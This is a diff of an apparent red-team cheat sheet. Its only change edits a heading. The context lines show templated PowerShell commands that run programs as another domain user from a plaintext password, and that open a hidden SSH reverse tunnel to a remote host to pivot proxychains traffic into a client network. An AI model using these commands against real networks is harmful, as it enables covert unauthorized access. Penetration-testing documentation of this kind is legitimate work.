@@ -8,7 +8,7 @@ Start-Process -wi 1 -FilePath "cmd" -ArgumentList "/c type <powershellScript> | 
 $scp = ConvertTo-SecureString '<password>' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $scp); start-process -wi 1 -FilePath "cmd.exe" -ArgumentList "/c <command>" -Credential $cred
 ```
 
-### Forward proxychains traffic into client network, will provoce short opening of a powershell window
+### Forward proxychains traffic into client network
 ```
 Start-Process -wi 1 -FilePath "powershell" -ArgumentList " -w hidden -c ssh -o 'StrictHostKeyChecking=no' -i .\<privateKey> -N -R 9050 <user>@<rhost>"
 ```
